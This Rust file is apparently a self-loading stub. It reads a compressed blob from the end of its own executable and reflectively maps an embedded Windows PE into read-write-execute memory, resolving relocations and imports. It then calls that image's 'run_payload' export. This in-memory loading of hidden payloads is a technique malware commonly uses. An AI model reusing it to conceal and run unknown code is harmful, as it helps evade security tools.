use crate::META;
use core::ffi::c_void;
use std::ptr::{null, null_mut};

use windows_sys::Win32::Foundation::*;
use windows_sys::Win32::Storage::FileSystem::*;
use windows_sys::Win32::System::Diagnostics::Debug::{
    IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER, IMAGE_DIRECTORY_ENTRY_BASERELOC,
    IMAGE_DIRECTORY_ENTRY_IMPORT, IMAGE_DIRECTORY_ENTRY_EXPORT,
};
use windows_sys::Win32::System::SystemServices::{
    IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_EXPORT_DIRECTORY, IMAGE_IMPORT_BY_NAME,
    IMAGE_IMPORT_DESCRIPTOR, IMAGE_BASE_RELOCATION, IMAGE_REL_BASED_DIR64, IMAGE_REL_BASED_ABSOLUTE,
    IMAGE_ORDINAL_FLAG64,
};
use windows_sys::Win32::System::LibraryLoader::{GetModuleFileNameW, GetProcAddress, LoadLibraryA};
use windows_sys::Win32::System::Memory::{
    VirtualAlloc, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE
};

type RunPayloadFunc = unsafe extern "C" fn(*const u8, usize) -> u32;

pub unsafe fn get_module_file_name() -> Vec<u16> {
    let mut exe_path = vec![0u16; 1024];
    let len = GetModuleFileNameW(null_mut(), exe_path.as_mut_ptr(), exe_path.len() as u32);
    if len == 0 || len as usize == exe_path.len() {
        std::process::exit(1);
    }
    exe_path.truncate((len + 1) as usize);
    exe_path
}

pub unsafe fn run() {
    let wide_path = get_module_file_name();

    let handle = CreateFileW(
        wide_path.as_ptr(),
        FILE_READ_ATTRIBUTES | FILE_READ_DATA,
        FILE_SHARE_READ,
        core::ptr::null(),
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        core::ptr::null_mut(),
    );

    if handle == INVALID_HANDLE_VALUE {
        std::process::exit(2);
    }

    let mut file_size: i64 = 0;
    if GetFileSizeEx(handle, &mut file_size) == 0 {
        std::process::exit(3);
    }

    let pool_len = META.pool_len as usize;
    if pool_len == 0 {
        std::process::exit(4);
    }

    if file_size < pool_len as i64 {
        std::process::exit(5);
    }

    let mut distance: i64 = 0;
    if SetFilePointerEx(handle, file_size - pool_len as i64, &mut distance, FILE_BEGIN) == 0 {
        std::process::exit(6);
    }

    let mut compressed_data = vec![0u8; pool_len];
    let mut read_bytes: u32 = 0;
    
    // Read the pool entirely
    let mut total_read = 0;
    while total_read < pool_len {
        let mut n: u32 = 0;
        let to_read = core::cmp::min(pool_len - total_read, 0xFFFFFFFF) as u32;
        if ReadFile(handle, compressed_data.as_mut_ptr().add(total_read) as *mut _, to_read, &mut n, null_mut()) == 0 {
            std::process::exit(7);
        }
        if n == 0 {
            std::process::exit(8);
        }
        total_read += n as usize;
    }
    CloseHandle(handle);

    let total_pool = META.payload_offset + META.payload_len;
    let mut decompressed_pool = vec![0u8; total_pool as usize];

    let mut out_offset = 0;
    let _ = crate::decompress::decompress_to_writer(&compressed_data, |chunk| {
        let end = out_offset + chunk.len();
        if end <= decompressed_pool.len() {
            decompressed_pool[out_offset..end].copy_from_slice(chunk);
            out_offset = end;
        }
    });

    let washmhost_data = &decompressed_pool[META.washmhost_offset as usize..(META.washmhost_offset + META.washmhost_len) as usize];
    let payload_data = &decompressed_pool[META.payload_offset as usize..(META.payload_offset + META.payload_len) as usize];

    // -- Reflective PE Loader --
    let module_base = washmhost_data.as_ptr();
    let dos_header = &*(module_base as *const IMAGE_DOS_HEADER);
    if dos_header.e_magic != IMAGE_DOS_SIGNATURE {
        std::process::exit(10);
    }

    let nt_headers = &*(module_base.add(dos_header.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);
    if nt_headers.Signature != 0x00004550 {
        std::process::exit(11);
    }

    let size_of_image = nt_headers.OptionalHeader.SizeOfImage as usize;
    let image_base_pref = nt_headers.OptionalHeader.ImageBase as *mut u8;

    // Try to allocate at preferred base, otherwise anywhere
    let mut image_base = VirtualAlloc(
        image_base_pref as *mut c_void,
        size_of_image,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    ) as *mut u8;

    if image_base.is_null() {
        image_base = VirtualAlloc(
            null_mut(),
            size_of_image,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        ) as *mut u8;
    }

    if image_base.is_null() {
        std::process::exit(12);
    }

    // Map Headers
    let size_of_headers = nt_headers.OptionalHeader.SizeOfHeaders as usize;
    std::ptr::copy_nonoverlapping(module_base, image_base, size_of_headers);

    // Map Sections
    let section_header_base = (module_base.add(dos_header.e_lfanew as usize) as *const u8)
        .add(core::mem::size_of::<IMAGE_NT_HEADERS64>());

    let num_sections = nt_headers.FileHeader.NumberOfSections as usize;
    for i in 0..num_sections {
        let section = &*(section_header_base.add(i * core::mem::size_of::<IMAGE_SECTION_HEADER>())
            as *const IMAGE_SECTION_HEADER);

        if section.SizeOfRawData > 0 {
            let dest = image_base.add(section.VirtualAddress as usize);
            let src = module_base.add(section.PointerToRawData as usize);
            std::ptr::copy_nonoverlapping(src, dest, section.SizeOfRawData as usize);
        }
    }

    // Process Relocations if we couldn't allocate at preferred address
    let delta = image_base as isize - nt_headers.OptionalHeader.ImageBase as isize;
    if delta != 0 {
        let reloc_dir = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
        if reloc_dir.Size > 0 {
            let mut reloc_ptr = image_base.add(reloc_dir.VirtualAddress as usize);
            let reloc_end = reloc_ptr.add(reloc_dir.Size as usize);

            while reloc_ptr < reloc_end {
                let block = &*(reloc_ptr as *const IMAGE_BASE_RELOCATION);
                if block.SizeOfBlock == 0 {
                    break;
                }

                let entries = (block.SizeOfBlock as usize - core::mem::size_of::<IMAGE_BASE_RELOCATION>()) / 2;
                let entry_ptr = reloc_ptr.add(core::mem::size_of::<IMAGE_BASE_RELOCATION>()) as *const u16;

                for i in 0..entries {
                    let entry = *entry_ptr.add(i);
                    let reloc_type = entry >> 12;
                    let offset = entry & 0x0FFF;

                    if reloc_type as u32 == IMAGE_REL_BASED_DIR64 {
                        let target = image_base.add(block.VirtualAddress as usize + offset as usize) as *mut u64;
                        *target = (*target as isize + delta) as u64;
                    } else if reloc_type as u32 != IMAGE_REL_BASED_ABSOLUTE {
                        // We only expect DIR64 or ABSOLUTE (pad) on x64
                        std::process::exit(13);
                    }
                }
                reloc_ptr = reloc_ptr.add(block.SizeOfBlock as usize);
            }
        }
    }

    // Process Imports
    let import_dir = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT as usize];
    if import_dir.Size > 0 {
        let mut import_ptr = image_base.add(import_dir.VirtualAddress as usize);

        loop {
            let desc = &*(import_ptr as *const IMAGE_IMPORT_DESCRIPTOR);
            if desc.Name == 0 {
                break;
            }

            let dll_name = image_base.add(desc.Name as usize);
            let h_module = LoadLibraryA(dll_name);
            if h_module.is_null() {
                std::process::exit(14);
            }

            let mut original_first_thunk = if desc.Anonymous.OriginalFirstThunk != 0 {
                image_base.add(desc.Anonymous.OriginalFirstThunk as usize) as *const u64
            } else {
                image_base.add(desc.FirstThunk as usize) as *const u64
            };

            let mut first_thunk = image_base.add(desc.FirstThunk as usize) as *mut u64;

            while *original_first_thunk != 0 {
                if *original_first_thunk & IMAGE_ORDINAL_FLAG64 != 0 {
                    let ordinal = (*original_first_thunk & 0xFFFF) as usize;
                    let addr = GetProcAddress(h_module, ordinal as *const u8);
                    *first_thunk = addr.unwrap() as u64;
                } else {
                    let by_name = image_base.add((*original_first_thunk as u32) as usize) as *const IMAGE_IMPORT_BY_NAME;
                    let func_name = by_name.add(1).cast::<u8>();
                    let addr = GetProcAddress(h_module, func_name);
                    if let Some(f) = addr {
                        *first_thunk = f as u64;
                    } else {
                        // Missing export
                        std::process::exit(15);
                    }
                }
                original_first_thunk = original_first_thunk.add(1);
                first_thunk = first_thunk.add(1);
            }
            import_ptr = import_ptr.add(core::mem::size_of::<IMAGE_IMPORT_DESCRIPTOR>());
        }
    }

    // Find export: run_payload
    let export_dir_rva = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize].VirtualAddress;
    if export_dir_rva == 0 {
        std::process::exit(16);
    }
    
    let export_dir = &*(image_base.add(export_dir_rva as usize) as *const IMAGE_EXPORT_DIRECTORY);
    let names = image_base.add(export_dir.AddressOfNames as usize) as *const u32;
    let funcs = image_base.add(export_dir.AddressOfFunctions as usize) as *const u32;
    let ordinals = image_base.add(export_dir.AddressOfNameOrdinals as usize) as *const u16;

    let target_name = b"run_payload\0";
    let mut run_payload_addr = null_mut();

    for i in 0..export_dir.NumberOfNames {
        let name_rva = *names.add(i as usize);
        let name_ptr = image_base.add(name_rva as usize);
        
        let mut match_name = true;
        for j in 0..target_name.len() {
            if *name_ptr.add(j) != target_name[j] {
                match_name = false;
                break;
            }
        }
        
        if match_name {
            let ordinal = *ordinals.add(i as usize) as usize;
            let func_rva = *funcs.add(ordinal);
            run_payload_addr = image_base.add(func_rva as usize);
            break;
        }
    }

    if run_payload_addr.is_null() {
        std::process::exit(17);
    }

    let run_payload: RunPayloadFunc = core::mem::transmute(run_payload_addr);
    
    let exit_code = run_payload(payload_data.as_ptr(), payload_data.len());
    std::process::exit(exit_code as i32);
}
